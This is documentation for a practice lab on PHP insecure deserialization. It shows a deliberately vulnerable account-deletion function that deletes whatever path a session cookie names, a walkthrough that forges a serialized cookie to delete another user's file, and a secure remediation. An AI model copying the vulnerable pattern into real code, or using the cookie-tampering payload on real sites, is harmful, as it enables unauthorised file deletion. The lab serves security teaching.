# Lab 03: Using Application Functionality to Exploit Insecure Deserialization

## Lab Information

| Field | Value |
|-------|-------|
| **Lab Title** | Using Application Functionality to Exploit Insecure Deserialization |
| **Category** | Insecure Deserialization |
| **Difficulty** | PRACTITIONER |
| **Attack Vector** | Arbitrary file deletion via serialized object manipulation |

## Overview

This lab demonstrates how insecure deserialization can be combined with legitimate application functionality to perform malicious actions. The application stores user session data in a serialized PHP object within a cookie, including the path to the user's avatar file. The account deletion feature uses this path to clean up the user's avatar, but trusts client-controlled data without validation.

## Target

Delete the file `/home/carlos/morale.txt` from Carlos's home directory by exploiting the insecure deserialization vulnerability in the account deletion feature.

## Credentials

| Username | Password | Role |
|----------|----------|------|
| `wiener` | `peter` | Regular User |
| `gregg` | `rosebud` | Regular User |

## Technical Details

### User Class Structure

```php
class User {
    public $username;
    public $avatar_link;
}
```

### Session Cookie Format

The session cookie contains a Base64-encoded serialized PHP object with an **absolute path**:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:XX:"C:\xampp\htdocs\...\Lab-03/home/wiener/avatar.jpg";}
```

**Important:** The `avatar_link` contains the FULL ABSOLUTE PATH on the server. You must use this same base path when targeting Carlos's file.

### Vulnerable Code

```php
function deleteUserAccount($sessionData) {
    // ...
    
    // VULNERABLE: Uses avatar_link from cookie, not database
    $avatarPath = $sessionData->avatar_link;
    
    if (!empty($avatarPath) && file_exists($avatarPath)) {
        // Deletes whatever file is in avatar_link!
        unlink($avatarPath);
    }
    
    // ...
}
```

## Solution Walkthrough

### Step 1: Login and Capture Cookie

1. Navigate to the login page
2. Login with credentials `wiener:peter`
3. Go to "My Account" page
4. Observe the session cookie displayed on the page

### Step 2: Decode the Cookie

Decode the Base64 cookie to see the serialized object:

```bash
echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMToiYXZhdGFyX2xpbmsiO3M6NDI6Ii9wYXRoL3RvL2xhYi9ob21lL3dpZW5lci9hdmF0YXIuanBnIjt9" | base64 -d
```

### Step 3: Modify avatar_link

Change the `avatar_link` value to target Carlos's file, keeping the same base path:

**Original (example - your path will vary):**
```
s:11:"avatar_link";s:75:"C:\xampp\htdocs\LABx_Docs\Insecure-Deserialization\Lab-03/home/wiener/avatar.jpg"
```

**Modified (replace the end of the path):**
```
s:11:"avatar_link";s:76:"C:\xampp\htdocs\LABx_Docs\Insecure-Deserialization\Lab-03/home/carlos/morale.txt"
```

**Important:** Update the string length (`s:XX`) to match your new path length. Count all characters in your path!

### Step 4: Create the Payload

Complete modified serialized object (example - use YOUR actual path):

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:76:"C:\xampp\htdocs\LABx_Docs\Insecure-Deserialization\Lab-03/home/carlos/morale.txt";}
```

### Step 5: Encode and Inject

Base64 encode the payload:

**PowerShell:**
```powershell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('YOUR_PAYLOAD_HERE'))
```

**Bash:**
```bash
echo -n 'YOUR_PAYLOAD_HERE' | base64
```

### Step 6: Replace Cookie and Trigger Deletion

1. Open browser developer tools (F12)
2. Go to Application → Cookies
3. Replace the `session` cookie value with the encoded payload
4. Click "Delete My Account" button
5. The server will delete Carlos's `morale.txt` instead of your avatar

## Why the Exploit Works

1. **Client-Controlled Data**: The `avatar_link` is stored in a client-side cookie
2. **No Server-Side Validation**: The server trusts the cookie data without validating against the database
3. **Dangerous Operation**: `unlink()` is called on the user-controlled path
4. **Legitimate Feature Abuse**: The file deletion is a legitimate feature, just used with malicious data

## Remediation

### Secure Implementation

```php
function deleteUserAccountSecure($sessionData) {
    $pdo = getDBConnection();
    
    // FIX 1: Get avatar_link from DATABASE, not cookie
    $stmt = $pdo->prepare("SELECT avatar_link FROM users WHERE username = ?");
    $stmt->execute([$sessionData->username]);
    $user = $stmt->fetch();
    
    $avatarPath = $user['avatar_link'];
    
    // FIX 2: Validate path is within allowed directory
    $allowedDir = realpath(__DIR__ . '/uploads');
    $resolvedPath = realpath($avatarPath);
    
    if ($resolvedPath && strpos($resolvedPath, $allowedDir) === 0) {
        unlink($resolvedPath);
    }
    
    // Continue with account deletion...
}
```

### Security Best Practices

1. **Never Trust Client Data**: Always fetch sensitive data from server-side sources
2. **Validate File Paths**: Use `realpath()` and directory prefix checks
3. **Principle of Least Privilege**: Store only identifiers in cookies, not file paths
4. **Signed Cookies**: Use HMAC signatures to prevent cookie tampering
5. **Directory Restrictions**: Ensure file operations only work within allowed directories

## File Structure

```
Lab-03/
├── config.php           # User class and vulnerable functions
├── database_setup.sql   # SQL schema
├── delete-account.php   # Vulnerable deletion handler
├── docs.php             # Technical documentation
├── home/
│   ├── carlos/
│   │   └── morale.txt   # Target file to delete
│   ├── gregg/
│   │   └── avatar.jpg   # User avatar
│   └── wiener/
│       └── avatar.jpg   # User avatar
├── index.php            # Landing page
├── lab-description.php  # Challenge description
├── LAB_DOCUMENTATION.md # This file
├── login.php            # Authentication
├── logout.php           # Session cleanup
├── my-account.php       # Account page with cookie display
├── README.md            # Quick reference
├── setup_db.php         # Database initialization
├── success.php          # Completion page
└── uploads/             # Avatar storage
```

## Database Schema

```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    avatar_link VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## References

- [PHP Serialization](https://www.php.net/manual/en/function.serialize.php)
- [OWASP Insecure Deserialization](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests)
- [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)

## Lab Completion Criteria

The lab is solved when `/home/carlos/morale.txt` no longer exists. The application automatically detects this and displays "Lab Solved" status on the home page.
